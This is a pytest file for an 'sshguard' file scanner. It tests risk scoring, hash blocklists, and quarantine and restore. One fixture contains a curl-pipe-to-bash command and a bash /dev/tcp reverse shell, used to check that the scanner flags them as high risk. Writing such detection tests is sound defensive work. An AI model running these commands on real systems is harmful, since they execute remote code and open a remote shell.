from pathlib import Path

from sshguard import quarantine
from sshguard.scanner import assess_file


def test_hidden_script_with_reverse_shell_indicators_is_high_risk(tmp_path: Path) -> None:
    sample = tmp_path / ".cache.sh"
    sample.write_text("curl https://example.invalid/x | bash\nbash -i >& /dev/tcp/127.0.0.1/4444 0>&1")

    result = assess_file(sample)

    assert result.score >= 70
    assert result.severity == "HIGH"
    assert len(result.findings) >= 2


def test_blocklist_match_is_high_risk(tmp_path: Path) -> None:
    sample = tmp_path / "note.txt"
    sample.write_text("harmless test content")

    digest = assess_file(sample).sha256
    result = assess_file(sample, {digest})

    assert result.score == 100
    assert "blocklist" in result.findings[0].reason


def test_fast_scan_can_skip_hashing(tmp_path: Path) -> None:
    sample = tmp_path / "safe.txt"
    sample.write_text("safe content")

    result = assess_file(sample, compute_hash=False)

    assert result.readable is True
    assert result.sha256 is None
    assert result.score == 0


def test_unreadable_or_missing_file_is_reported(tmp_path: Path) -> None:
    result = assess_file(tmp_path / "missing.txt")

    assert result.readable is False
    assert result.error


def test_quarantine_moves_file_and_records_restore_metadata(tmp_path: Path, monkeypatch) -> None:
    quarantine_dir = tmp_path / "quarantine"
    monkeypatch.setattr(quarantine, "QUARANTINE_DIR", quarantine_dir)
    sample = tmp_path / "suspicious.txt"
    sample.write_text("test")

    record = quarantine.quarantine_file(sample)

    assert not sample.exists()
    assert Path(record["quarantine_path"]).exists()
    assert Path(record["original_path"]) == sample
    assert record["delete_after"]


def test_quarantine_restore_returns_file_to_original_location(tmp_path: Path, monkeypatch) -> None:
    quarantine_dir = tmp_path / "quarantine"
    monkeypatch.setattr(quarantine, "QUARANTINE_DIR", quarantine_dir)
    sample = tmp_path / "restore-me.txt"
    sample.write_text("test")

    record = quarantine.quarantine_file(sample)
    quarantine.restore_file(record)

    assert sample.read_text() == "test"
    assert not Path(record["quarantine_path"]).exists()
